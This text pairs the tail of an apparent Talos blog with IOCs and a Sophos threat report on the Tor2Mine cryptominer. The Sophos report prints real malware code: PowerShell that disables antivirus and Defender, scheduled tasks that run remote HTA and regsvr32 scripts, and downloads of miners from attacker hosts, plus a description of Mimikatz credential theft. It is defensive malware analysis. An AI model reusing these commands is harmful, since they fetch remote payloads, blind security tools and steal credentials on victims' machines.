@@ -1,0 +1,528 @@
+allow the C2 server's IP address to be hidden.
+Analysis
+Talos recently identified activity in our endpoint telemetry associated with Tor2Mine
+affecting at least six different companies. The activity has been ongoing since January 2020,
+resurfacing after a likely year-long hiatus since we first identified the threat actor in
+December 2018. While much of the infrastructure remains the same, we identified a new IP
+and two domains that we assess are currently being leveraged by Tor2Mine. During the
+course of our research, we also discovered evidence suggesting that the Tor2Mine actors are
+deploying additional malware in tandem with XMRig during their operations to harvest
+credentials and steal more money. The new malware includes AZORult, an information-
+stealing malware; the remote access tool Remcos; the DarkVNC backdoor trojan; and a
+clipboard cryptocurrency stealer.
+Tor2Mine resurfaces
+In much of this recent activity, the actors use previously identified infrastructure to carry out
+their operations. In one cluster of activity against a telecommunications company, we
+observed the attacker executing PowerShell commands to download files from multiple
+Tor2Mine-related domains. The attacker attempts to run Microsoft HTML Applications
+(HTA) from multiple URLs (listed below) using Mshta, a utility for executing HTA files:
+hxxps[:]//qm7gmtaagejolddt[.]onion[.]to/check[.]hta
+hxxp[:]//res1[.]myrms[.]pw/upd[.]hta
+hxxp[:]//eu1[.]minerpool[.]pw/check[.]hta The qm7gmtaagejolddt[.]onion[.] domain is
+a known Tor2web gateway used by Tor2Mine actors to proxy communications.
+According to our previously mentioned blog, the actors have been using this domain
+since at least 2018. The res1[.]myrms[.]pw domain also appears to have connections to
+Tor2Mine, as it is hosted on an IP address (107[.]181[.]187[.]132) previously known to
+be used by Tor2Mine actors. In the activity outlined in our 2018 blog, Tor2Mine actors
+used a PowerShell script to install follow-on malware onto the compromised system
+from this same IP. The eu1[.]minerpool[.]pw, also hosted on 107[.]181[.]187[.]132, is
+the same mining pool the actors used in the 2018 activity.
+2/8
+The actor also used a PowerShell command to download a .ps1 file from
+hxxp[:]//v1[.]fym5gserobhh[.]pw/v1/check1[.]ps1. The v1[.]fym5gserobhh[.]pw domain is
+hosted on the same aforementioned IP. According to Umbrella data, v1[.]fym5gserobhh[.]pw
+and eu1[.]minerpool[.]pw are registered under two different reg[.]ru nameservers
+(ns2[.]reg[.]ru and ns1[.]reg[.]ru).
+New infrastructure identified
+While we identified many of the same domains and IP addresses being used from 2018 in
+this more recent activity, we also identified several new indicators of compromise (IOCs) that
+were not previously associated with Tor2Mine. In similar activity related to another company
+in mid-May, we saw the actors using Mshta to execute HTA files from many of the same
+URLs mentioned above. However, we also observed a new domain, eu1[.]ax33y1mph[.]pw, in
+activity affecting an environmental consulting company between April and May 2020. The
+domain is hosted on the same 107[.]181[.]187[.]132 IP address and was first seen in March
+2020, according to Umbrella, suggesting this is a relatively new component of the attacker’s
+infrastructure.
+Umbrella data showing the DNS resolution information for eu1[.]ax33y1mph[.]pw
+As our research progressed, we continued to identify related threat activity against several
+more companies involving the use of new Tor2Mine infrastructure. We identified a new IP,
+185[.]10[.]68[.]147, hosting at least two domains, asq[.]r77vh0[.]pw and asq[.]d6shiiwz[.]pw,
+that we assess are part of Tor2Mine’s infrastructure. The asq[.]r77vh0[.]pw domain is
+registered under the same two previously mentioned reg[.]ru providers. It first appeared in
+our endpoint telemetry for two days in July 2019 but did not reappear until late February
+2020. This domain was previously hosted on 107[.]181[.]160[.]197, an IP used by Tor2Mine
+actors, according to our 2018 blog.
+The asq[.]r77vh0[.]pw domain also has at least one referring file
+(67f5f339c71c9c887dfece5cb6e2ab698b8c8a575d1ab9dd37ac32232be1aa04) that reaches
+out to both the older 107[.]181[.]160[.]197 IP and the newly identified 185[.]10[.]68[.]147 IP,
+bolstering the notion that 185[.]10[.]68[.]147 is an extension of Tor2Mine’s infrastructure.
+3/8
+Cisco Umbrella showing a spike in DNS requests for asq[.]r77vh0[.]pw.
+The asq[.]d6shiiwz[.]pw domain is also registered under the same two reg[.]ru hosting
+providers. According to VirusTotal, this domain has hosted several URLs that are lexically
+similar to previously identified Tor2Mine URLs, such as those ending in “.hta” and
+“checking.ps1”. Two such examples are hxxp[:]//asq[.]d6shiiwz[.]pw/win/hssl/d6[.]hta and
+hxxps[:]//asq[.]d6shiiwz[.]pw/win/checking[.]ps1. Both domains were also previously
+hosted on the same IP address, 195[.]123[.]234[.]33, which also hosts malicious payloads
+associated with XMRig.
+We first observed these domains being hosted on 185[.]10[.]68[.]147 on March 15, 2020,
+according to Umbrella, and they remain associated as of this writing. This IP also hosts
+fh[.]fhcwk4q[.]xyz, a domain associated with XMRigCC, a variant of XMRig leveraged by
+many different threat actors. In addition to these domains, we also found several URLs
+hosted on 185[.]10[.]68[.]147 in VirusTotal that are structurally similar to many of the
+aforementioned Tor2Mine URLs, such as hxxp[:]//185[.]10[.]68[.]147/win/update[.]hta and
+hxxp[:]//185[.]10[.]68[.]147/win/del[.]ps1. As previously noted, Tor2Mine actors were
+observed using PowerShell commands to download .ps1 files and Mshta to execute .hta files. 
+The IP also has a communicating Shell script file
+(4d21cab49f7d7dd7d39df72b244a249277c37b5561e74420dfc96fb22c8febac). The content of
+this file includes a string with a wget request to hxxp[:]//asq[.]r77vh0[.]pw/lin/update[.]sh.
+From there, we identified a file
+(daa768e8d66aa224491000e891f1ef2cb7c674df2f3097fef7db90d692e2f539) in VirusTotal
+whose content shows an identical wget request (“wget --user-agent "linux" -q -O -
+hxxp://asq[.]r77vh0[.]pw/lin/update[.]sh”). This file reaches out to the aforementioned
+195[.]123[.]234[.]33, an XMRigCC IP that previously hosted the newly identified domains,
+according to VirusTotal and Umbrella, respectively.
+4/8
+File containing the Tor2Mine IP and domain.
+Using the same approach, we identified several other files that also had this string in their
+contents. One such file,
+3c2d83b9e9b1b107c3db1185229865b658bbaebc8020c1b2a4f9155ca87858fc, has embedded
+URLs that are hosted on 107[.]181[.]187[.]132 (e.g.,
+hxxp[:]//107[.]181[.]160[.]197/lin/32/xmrig), which we previously mentioned is a known
+Tor2Mine IP. These connections to the older Tor2Mine infrastructure further suggests that
+185[.]10[.]68[.]147 is a new IP used by the same actors.
+New malware added to the mix
+During the course of our research, we discovered evidence suggesting that the Tor2Mine
+actors are deploying AZORult and other malware in tandem with XMRig during their
+operations to harvest credentials and steal more money. Our previous research from April
+2020 outlined a complex campaign with several different executable payloads focused on
+obtaining money for the attackers. The campaign included the use of a variant of AZORult,
+an information-stealing malware; as well as the RAT Remcos; the DarkVNC backdoor trojan;
+and a clipboard cryptocurrency stealer. Much of the infrastructure mentioned in the April
+blog overlaps with many of the new Tor2Mine IOCs we identified. According to the blog,
+there were several domains referenced in the configuration for an XMRigCC payload during
+these campaigns, including eu[.]minerpool[.]pw and rs[.]fym5gserobhh[.]pw, both lexically
+similar to the eu1[.]minerpool[.]pw and v1[.]fym5gserobhh[.]pw domains we discovered in
+our recent research. The configuration also mentioned 185[.]10[.]68[.]220, our newly
+identified Tor2Mine IP.  In addition to these similarities, the April blog also mentions the
+AZORult actors downloading XMRig from 195[.]123[.]234[.]33, which previously hosted the
+two newly identified Tor2Mine domains, asq[.]r77vh0[.]pw and asq[.]d6shiiwz[.]pw.
+Furthermore, these two domains were also used by the actors outlined in the April blog. The
+URLs associated with these domains are structurally similar to many of the URLs we
+observed during the course of our recent Tor2Mine discoveries, including
+hxxps://asq[.]r77vh0[.]pw/win/checking[.]ps1 and
+hxxps://asq[.]d6shiiwz[.]pw/win/hssl/d6[.]hta.
+5/8
+The likely addition of AZORult and additional malware to Tor2Mine’s tactics, techniques,
+and procedures (TTPs) shows that the actors remain active and continue to look for ways to
+update their capabilities to increase their monetary gain. Notably, the Tor2Mine activity from
+this year is consistent with a general uptick in cryptocurrency miners observed by Talos over
+the last several months, including a resurgence in PowerGhost and MyKings.
+The big picture
+Many bad actors, like Tor2Mine, who distribute malware for profit often have operational
+challenges that are similar to many legitimate global enterprises, such as product creation,
+distribution, overhead, infrastructure, supply chain and resilient revenue streams. As we
+have seen in the Tor2Mine activity, financially motivated cyber threat actors will continue to
+reinvent themselves and find new methods of generating revenue, as their survival depends
+on it. If crytominers cease to be profitable enough for the operators, bad actors will probably
+diversify their attack portfolios to include even more dangerous threats like ransomware.
+Ultimately, just as organizations have to adapt to a continually changing environment to stay
+in business, malware distribution groups must also remain agile and respond to new
+challenges.
+Advanced Malware Protection (AMP) is
+ideally suited to prevent the execution of the
+malware used by these threat actors. Exploit
+Prevention present within AMP is designed
+to protect customers from unknown attacks
+such as this automatically. 
+Cisco Cloud Web Security (CWS) or Web
+Security Appliance (WSA) web scanning
+prevents access to malicious websites and
+detects malware used in these attacks.
+Email Security can block malicious emails
+sent by threat actors as part of their
+campaign.
+Network Security appliances such as Next-
+Generation Firewall (NGFW), Next-
+Generation Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX can detect
+malicious activity associated with this threat.
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco
+Security products.
+Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious
+domains, IPs, and URLs, whether users are on or off the corporate network.
+6/8
+Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the
+latest rule pack available for purchase on Snort.org.
+IOCs
+Domains
+v1[.]fym5gserobhh[.]pw
+res1[.]myrms[.]pw
+eu1[.]minerpool[.]pw
+eu1[.]ax33y1mph[.]pw
+asq[.]r77vh0[.]pw
+asq[.]d6shiiwz[.]pw
+IPs 107[.]181[.]187[.]132
+185[.]10[.]68[.]147
+195[.]123[.]234[.]33
+URLs
+hxxp[:]//v1.fym5gserobhh.pw/php/func.php
+hxxp[:]//v1.fym5gserobhh.pw/v1/check1.ps1
+hxxp[:]//eu1.minerpool.pw/check.hta
+hxxp[:]//eu1.minerpool.pw/upd.hta
+hxxp[:]//eu1.minerpool.pw/rckl/check.hta
+hxxp[:]//res1.myrms.pw/upd.hta
+hxxps[:]//eu1.ax33y1mph.pw/check.hta
+hxxps[:]//qm7gmtaagejolddt.onion.to/check.hta
+hxxps[:]//asq.r77vh0.pw/win/hssl/r7.hta
+hxxps[:]//asq.r77vh0.pw/win/php/func.php hxxp[:]//asq.r77vh0.pw/win/checking.hta
+hxxp[:]//asq.d6shiiwz.pw/win/hssl/d6.hta
+hxxps[:]//asq.d6shiiwz.pw/win/checking.ps1
+hxxp[:]//107.181.160.197/lin/32/xmrig
+hxxp[:]//185.10.68.147/win/update.hta
+hxxp[:]//185.10.68.147/win/del.ps1qm7gmtaagejolddt.onion.to
+File hashes
+67f5f339c71c9c887dfece5cb6e2ab698b8c8a575d1ab9dd37ac32232be1aa04
+4d21cab49f7d7dd7d39df72b244a249277c37b5561e74420dfc96fb22c8febac
+3c2d83b9e9b1b107c3db1185229865b658bbaebc8020c1b2a4f9155ca87858fc
+daa768e8d66aa224491000e891f1ef2cb7c674df2f3097fef7db90d692e2f539
+7/8
+8/8
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+Two ﬂavors of Tor2Mine miner dig deep into networks with PowerShell,
+VBScript
+Using remote scripts and code, one variant can even execute ﬁlelessly until it gains administrative
+credentials.
+Written by Sean Gallagher
+DECEMBER 02, 2021
+THREAT RESEARCH  
+CRYPTOMINERS
+FEATURED  
+TOR2MINE
+Over the past few months, we’ve seen quite a few cryptocurrency mining campaigns leveraging the latest wave of
+widespread enterprise server software vulnerabilities, including the ProxyShell/ProxyLogon exploits targeting on-premises
+Microsoft Exchange Server deployments and VMware vCenter. Usually, these intrusions are limited in scope.
+But we’ve seen a return of a miner variant that goes much further. Previously identiﬁed as Tor2Mine by researchers (because
+of the use in some variants of a Tor gateway to communicate with the coin miner’s command and control server). Based on
+XMRigCC , a centrally-conﬁgurable miner intended for leveraging whole networks of worker machines, this Monero-mining
+campaign continues to evolve as its operators try to ﬁnd new ways to evade defenses and maintain a presence on infected
+networks.
+Tor2Mine uses a PowerShell script that attempts to disable malware protection, execute a miner payload and harvest
+Windows credentials. Using those credentials, Tor2Mine can spread itself, and will continue to re-infect other systems on the
+compromised network if not completely eradicated and malware protection is not present.
+On systems where it manages to gain administrative credentials, Tor2Mine installs executables as a service, and then
+searches for other machines on the network that it can remotely execute installation scripts on to spread further.
+On systems where it does not gain administrative privileges, Tor2Mine can execute ﬁlelessly by way of commands run as
+scheduled tasks. Sophos telemetry saw a surge of detections for Tor2Mine (detected as the Mal/MineJob family) early in
+2021. Since then, while declining overall, we’ve seen the introduction of new variants.
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+1/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+Since June, we’ve seen two different takes on Tor2Mine showing up repeatedly in  our telemetry. While we’ve seen two
+speciﬁc sets of infrastructure associated with these variants, we discovered minor differences in other samples  discovered
+in VirusTotal data from the same period—suggesting minor tweaks by different sets of operators or by the same actors
+between campaigns. But the underlying game plan is almost always the same: by exploiting a remote code execution bug,
+the miner operator launches a PowerShell script that attempts to shut down malware protection and open up shop.
+Both scripts attempt to shut down anti-malware protection, searching the Windows registry for installed products and
+sending commands to stop services. Both retrieve additional scripts (both PowerShell and VBScript) from a command and
+control server in an attempt to prevent analysis of their attack. And both install the same miner code, using detection of the
+targeted system’s processor and operating system version to determine whether to install a 32-bit or 64-bit version of the
+miner.
+There are two basic takes on the variants: one expects to have system level privileges when executed and exploits that in
+spreading, while the other tests to see what privileges are available.
+Cashing in on access
+The ﬁrst type of Tor2Mine variant we’ve encountered is deployed after the actor has already achieved system-level or
+administrator-level privileges through the initial access exploit. It checks for the architecture of the local processor in its ﬁrst
+few lines as it sets variables for the rest of the script.
+$arch = Get-WmiObject Win32_Processor Select-Object -Exp AddressWidth  
+$WebClient = New-Object System.Net.WebClient  
+$WarningPreference = "SilentlyContinue"  
+$erroractionpreference = "SilentlyContinue"  
+$LogCommandLifeCycleEvent = $false  
+$tskPath="C:\Windows\System32\Tasks"  
+if((test-path "$tskPath\Microsoft\Windows\WDI\UPDShell") -eq $true)  
+  { cmd /c SCHTASKS /delete /tn \Microsoft\Windows\WDI\UPDShell /f out-null
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+2/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+Then it attempts to take out malware protection—in this case, MalwareBytes and Sophos are targeted, as well as Windows
+Defender. (This behavior is blocked by AMSI-enabled behavior detection and tamper protection in Intercept X.)
+if((Get-Service 
+where-object {$_.Name -eq "MBAMService"}) -ne $null) { 
+C:\Windows\System32\cmd.exe /c sc stop MBAMService 
+C:\Windows\System32\cmd.exe /c sc delete MBAMService 
+C:\Windows\System32\cmd.exe /c sc stop MBAMProtection 
+C:\Windows\System32\cmd.exe /c sc delete MBAMProtection 
+where-object {$_.DisplayName -like "*Sophos*"}) -ne $null) 
+get-service 
+where-object {$_.DiplayName -like "*Sophos*"} 
+foreach {cmd /c sc stop $_.Name} 
+cmd /c sc stop WinDefend 
+cmd /c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t 
+REG_DWORD /d 1 /f 
+cmd /c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v 
+DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 
+cmd /c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v 
+DisableOnAccessProtection /t REG_DWORD /d 1 /f 
+cmd /c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v 
+DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 
+Next, it begins installing scripts to download other scripts needed to prepare the target for optimal mining operations. It looks
+for earlier instances of control scripts and zaps them, and then drops a remote script (after deleting any versions of it left by
+previous installations):
+if((test-path "C:\Windows\del.bat") -eq $true) { 
+rm C:\Windows\del.bat -force
+if($(test-file "C:\Windows\del.ps1") -eq $true) { 
+rm "C:\Windows\del.ps1" -force 
+$WebClient.DownloadFile("hxxp://107[.]181.187.132/ps1/del.ps1","C:\Windows\Fonts\del.ps1") 
+New-service -name "MalwareDel" -DisplayName "Microsoft Security Essentials" -StartupType Automatic -
+BinaryPathName "powershell -exec bypass -e QwA6AFwAVwBpAG4AZABvAHcAcwBcAEYAbwBuAHQAcwBcAGQAZQBsAC4AcABzADEA" -
+Description "Microsoft Antivirus Core Service" -ErrorAction Stop 
+} catch {} 
+cmd /c schtasks /create /tn \Microsoft\Windows\SetUpd /sc HOURLY /f /mo 1 /tr "powershell -exec bypass -e 
+QwA6AFwAVwBpAG4AZABvAHcAcwBcAEYAbwBuAHQAcwBcAGQAZQBsAC4AcABzADEA" /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST 
+Start-Sleep 1 
+Because these scripts (and the rest of the scripts associated with Tor2Mine) are largely loaded from their remote sources, or
+are self-deleting, they are not left on targeted machines; we were able to uncover some of them with VirusTotal.  The encoded
+command is the downloaded del.ps1 script, which gets instantiated as a service called “MalwareDel.” And in fact, it does
+delete malware—speciﬁcally, other miners that may have been installed on the system.
+The del.ps1 script is heavily obfuscated. Its actual contents are embedded in a Base64-encoded, compressed text string:
+iEX(neW-OBJEcT Io.coMPrESsION.DEFlatEstrEAM( [io.memoRysTReAM][SYstem.CONVerT]::fRoMbAsE64STrInG( 
+'fVpbU+NIsn7Gv0IPG4M9YLflu/vEPtBgpqGhm8X0zM4hiA4hy1ggS25J5rIs//3kl5VZJQN9YgarVJWVlfdLqVt17x/R1z8/7n9bTs 
++i/cvert/f7fSvmrffjtLt7YZX9+rb9fpgtv/s9/ovz73Oy7M/9F+eu/Tij9v0Mxi8PI/oz+/Tz3BIML2X5zE9/TZWAOLTTGf08jzgF 
+2AAPFB1e0AzfnnmFQLZ3tnudbFIAzz7DECICWDcpkkaAhPW2vhhnEOC6tKRoJBQM9YO7Rr0eIc/ZGoH/ 
+DLAue2OWRj45gkGaOT3QPdgjIOxpQOEOB1/RDidjKP8Pp3MUMweHThmNF1CTQg69Oi0aWWIo0YMx2yASmBlzulnDDEAt9+ 
+mHxDcaWPN774QPgIENX06dITZ3gjbcGCXIIHM95lImhoR3g5hI7gugXX4GEiaqaXBEDMsRJYcwXRpFudDYKwPKGSMM4DIH/ 
+mghn4giDF4xEYQMuobWXUIdw/ktAEBCgddkapIlyd9SITewUuP8MCMwDJNAb0/AInA6dOxfax0DXS/ 
+LdhorU+Y2BS65myGZYw8id19lhF46INyYg7YfRBIE9A9eINhggp/hLcBi5TtDNYCNARPKGEwEDVE5+ 
+Og3oiJwdnAD6WyTtv0A2uAlljgXRj9kCHhEHj1IfMOq2okZtY2CiY4yJmsDq9jthSaAlXsJ9ClD5+Ckw3A74htHqMuc8F+hh/ 
+W3JB/mB8iHgryYb7+mEWBUU/8CiJmR2i/kHM35+ffg2PPT5L4S234hRaP7/OouCuCcvjFzR+ntBIs73N6RAVWaNsuvZx/ 
+x0JRpLfBp053GdFbiSX6686KqDaXl6C7Mw+6QYQ52h49Rq2yyD6H99PTKW0tHgRu7nl/dEGj9wKw5Vw2pjLIIwEs8uhP0EHEzmpD2sC0
+% {neW-OBJEcT Io.sTREamreadeR($_, [SyStem.text.ENCodiNG]::aScIi) }).rEadtOeNd( ) 
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+3/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+This decompresses to a 116-line script that kills a variety of processes, services and tasks—almost all of them other
+crimeware, including a variety of coinminers and “clipper” malware that steals wallet addresses.
+Next, the main dropper script conﬁgures a series of remote VBScript script ﬁles as scheduled tasks.
+cmd /c SCHTASKS /create /tn \Microsoft\Windows\WDI\UPD /sc HOURLY /f /mo 5 /tr "cmd /c mshta 
+hxxp://eu1[.]minerpool.pw/upd.hta" /ru "NT AUTHORITY\SYSTEM" 
+cmd /c SCHTASKS /create /tn "\Microsoft\Windows Defender\ScannerSchduler" /sc DAILY /f /mo 1 /tr "cmd /c mshta 
+hxxp://res1.myrms.pw/upd.hta" /ru "NT AUTHORITY\SYSTEM" 
+cmd /c SCHTASKS /create /tn "\Microsoft\Windows\Diagnosis\ScheduledDiagnosis" /sc DAILY /f /mo 2 /tr "cmd /c 
+mshta hxxps://qm7gmtaagejolddt.onion.to/check.hta" /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST
+These remote scripts have a common feature— when they execute, they pop up a window that is quickly moved off-screen
+and sized to zero. Two of these scripts (both named upd.hta) are variations on the same code, and download additional
+scripts.
+The other script, check.hta, is here retrieved via a Tor gateway website. The script downloads another PowerShell script,
+check1.ps1 — a variation on the main dropper script that re-establishes the miner deployment. It also deploys v1.exe, an that
+creates and executes VBScript ﬁles written to temporary folders (such as %TEMP%\2b47.tmp\2b87.tmp\2b90.vbs). This is
+the mechanism Tor2Mine uses to spread across a network, (discussed later in this report).
+The main script also creates a scheduled task to ﬁre off a PowerShell command:
+cmd /c schtasks /create /tn \Microsoft\Windows\Multimedia\SystemVideoService /tr "cmd /c powershell -nop -noni -
+w 1 -enc 
+cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6AC8ALwAxADAANwAuADEAOAAxAC4AMQA4ADcALgAxADMAMgAvAHAAaABwAC8AZgB1AG
+ sc daily /mo 2 /f /ru SYSTEM/
+Decoded, that PowerShell command is the exploitation of Window’s regsvr32.exe to execute a remote script with the script
+object dynamic-link library daily:
+regsvr32 /u /s /i:hxxp://83[.]97.20.83/win/php/func.php scrobj.dll
+This script is yet another remote VBScript from a redundant C2, just in case the original C2 gets blocked.
+The main script then checks for and kills a variety of scheduled tasks—most of them tasks with names that correspond to
+names given to the miner executable and other malicious tasks and services. And then it downloads the actual miner (in this
+case, named C:\Windows\services.exe). The script sets permissions for services.exe , granting them to the “world” group
+(all users), deletes anything already named that, and then drops a processor-appropriate version of the miner at that name,
+conﬁguring it with the task name “WinSockets”:
+cmd /c attrib -s -h C:\Windows\services.exe 
+cmd /c icacls "C:\Windows\services.exe" /grant *S-1-1-0:F  
+cmd /c wmic process where ExecutablePath='C:\\Windows\\services.exe' delete 
+stop-process $((gwmi win32_process 
+where-object {$_.ExecutablePath -eq "C:\Windows\services.exe"}).ProcessID) -force 
+get-process 
+where-object {$_.Path -like "C:\Windows\services.exe"} 
+stop-process -force 
+rm C:\Windows\services.exe -force 
+IF ($arch -eq "64") 
+$WebClient.DownloadFile("hxxp://107[.]181.187.132/test/64.exe","C:\Windows\services.exe") 
+$WebClient.DownloadFile("hxxp://107[.]181.187.132/test/32.exe","C:\Windows\services.exe") 
+cmd /c schtasks /create /TN \Microsoft\Windows\Ras\WinSockets /TR "c:\windows\services.exe" /ST 00:00 /SC once 
+/DU 599940 /RI 1 /F /RL HIGHEST /RU SYSTEM 
+cmd /c schtasks /TN \Microsoft\Windows\Ras\WinSockets /run 
+cmd /c SCHTASKS /create /tn \Microsoft\Windows\UPnP\UPnPHostSearch /sc minute /f /mo 1 /tr "cmd /c schtasks /run 
+/TN \Microsoft\Windows\Ras\WinSockets" /RL HIGHEST /ru "NT AUTHORITY\SYSTEM" 
+cmd /c SCHTASKS /tn \Microsoft\Windows\UPnP\UPnPHostSearch /run 
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+4/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+stop-process -name "mshta" -force 
+cmd /c schtasks /tn \Microsoft\Windows\SetUpd /run
+At the end, it clears all running Windows scripts by forcing processes associated with mshta.exe to close, and launches the
+task tied to the remote updater scripts.
+Check your privilege
+The second new Tor2Web variant we’ve seen recently works in similar fashion, but its developer has decided that the script
+needs to be more maintainable—so they’ve broken its ﬂow down into functions. First, it sets a variable called $priv to
+determine whether the active user it runs under is an administrator, and performs an operating system version check for the
+variable $osver:
+$W = New-Object System.Net.WebClient 
+$arch = Get-WmiObject Win32_Processor | Select-Object -Exp AddressWidth 
+$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+$osver = ([environment]::OSVersion.Version).Major 
+$WarningPreference = "SilentlyContinue" 
+$erroractionpreference = "SilentlyContinue" 
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+This variant makes use of deﬁned functions to reuse parts of the script, using the boolean value of $priv to deﬁne the script’s
+ﬂow:
+IF ($priv -eq $true) 
+{ 
+StopAV 
+PrivTrueMStop 
+start-sleep 1 
+PrivTrue 
+CleanerEtc 
+#mimi 
+} else 
+{ 
+PrivFalsemStop 
+start-sleep 1 
+PrivFalse 
+CleanerNoPriv 
+} 
+get-process -name "mshta" -ErrorAction SilentlyContinue | ForEach-Object { 
+stop-process -id $_.Id } 
+Commented out in this version of the script is the “mimi” function, which runs a PowerShell version of the Mimikatz credential
+harvesting tool (kallen.ps1). This feature is not disabled in checking.ps1, this variant’s version of the check1.ps1 script, and
+in some other versions of this variant.
+There are two major differences between the privileged and non-admin routes for the script. The ﬁrst is that in the privileged
+version of the ﬂow, the script attempts to stop antivirus processes, which is not attempted when the script does not have
+administrator-level access.
+The second difference is that in situations where the primary script of this variant is running with administrator privileges, it
+installs the miner as “java.exe” in an “Oracle” folder. If the system is running the 64-bit version of Windows, the script also
+installs a driver to take advantage of the graphics adaptor on the system.
+Function PrivTrue() 
+{ 
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+5/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+if ((test-path C:\ProgramData\Oracle\Java) -eq $false) 
+{ 
+# mkdir C:\ProgramData\Oracle | out-null 
+# mkdir C:\ProgramData\Oracle\Java | out-null 
+New-Item "C:\ProgramData\Oracle\Java" -ItemType Directory | out-null 
+} 
+IF ($arch -eq "64") 
+{ 
+$W.DownloadFile("hxxp://83[.]97.20.81/win/min/64.exe", "C:\ProgramData\Oracle\Java\java.exe") 
+} ELSE 
+{ 
+$W.DownloadFile("hxxp://83[.]97.20.81/win/min/32.exe", "C:\ProgramData\Oracle\Java\java.exe") 
+} 
+if ( (!$(test-path "C:\Windows\System32\WinRing0x64.sys")) -and ($arch -eq "64") ) 
+{ 
+$W.DownloadFile("hxxps://83[.]97.20.81/win/deps/rx.exe", "C:\Windows\System32\WinRing0x64.sys") 
+}
+It’s probably not coincidental that the host used to download these executables is in the same subnet as the secondary C2
+for the ﬁrst variant we looked at—both are hosted by the same provider in Romania.
+On the other hand, if the main script executes without administrator-level privileges, then it takes a very different tack: it sets
+up a number of scheduled tasks like those in the ﬁrst variant we saw, one of which runs checking.ps1—but downloads the
+script for execution from the C2, rather than storing it locally.
+This script writes and executes a batch ﬁle, PrivFalse.bat, as a scheduled task. It also executes the Mimikatz remote script,
+attempting to get credentials to gain administrative privileges, and to attempt to spread throughout the network of the
+targeted organization.
+Enlarging the farm, plowing under the competition
+In both variants, the “check” step of the deployment installs scripts that are intended to expand the footprint of the miner
+deployment. The ﬁrst variant uses  WScript and Windows Management Instrumentation to iterate through systems
+discovered on the network and further spread the miner.
+The scripts are used to collect system information about other computers, discovering their operating system version.
+Function OSType() 
+strComputer = "." 
+Dim objWMI, objItem, colItems 
+Dim OSVersion, OSName, ProductType 
+Set objWMI = GetObject("winmgmts://" & strComputer & "/root/cimv2") 
+Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem",,48) 
+For Each objItem in colItems
+OSVersion = Left(objItem.Version,3) 
+ProductType = objItem.ProductType 
+Next 
+... 
+The script then uses the OS version to determine which version of the miner to be installed. It kills old versions of the miner,
+and installs the miner and a fresh copy of the remote “check” script as a scheduled task on each discovered machine.
+The second variant uses Mimikatz to mine for credentials. It uses a script named ichigo-lite.ps1 to scan the network for
+available IP addresses, create a table of credentials in memory of the machine it executes on, and then uses Invoke-
+Command to remotely execute scripts on the found IP addresses to infect them.
+Canary in the coin mine
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+6/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+Tor2Mine , like many other miners we’ve discovered in recent cases, is almost always a sign of vulnerability to other,
+potentially more dangerous network intrusions. It exploits networks with known vulnerabilities on their servers to gain entry—
+vulnerabilities that are easily detected from the Internet by network scans looking for telltales. Miners are a low-risk way for
+cyber criminals to turn a vulnerability into digital cash, with the greatest risk to their cash ﬂow being competing miners
+discovering the same vulnerable server that they gained entry with. But as we’ve seen in other recent cases, the same
+defensive gaps that allow miners to spread can lead to data and credential theft, as well as ransomware.
+Unlike other miners, Tor2Mine is much more difﬁcult to root out once it’s established a foothold on a network without the
+assistance of endpoint protection software and other anti-malware measures. Because it spreads laterally away from the
+initial point of compromise, it can’t be eliminated just by patching and cleaning one system. The miner will continually
+attempt to re-infect other systems on the network, even after the C2 server for the miner has been blocked or goes ofﬂine.
+Organizations that quickly patch software vulnerabilities on Internet-facing systems (such as web applications, VPN services,
+and email servers) are far less likely to fall victim to coin miners. And miners are usually easily detected by antimalware
+products—particularly those that leverage Windows’ Anti-Malware Software Interface to spot scripts intended to shut down
+malware protection. Sophos detects Tor2Mine variants as the MineJob family (MineJob-A through E), and detects the script
+behaviors of each variant. Indicators of compromise for the Tor2Mine variants discussed in this report are available on
+SophosLabs’ GitHub page.
+SophosLabs would like to acknowlege Vikas Singh of Sophos Rapid Response and Rajesh
+Nataraj of SophosLabs for their contributions to this report.
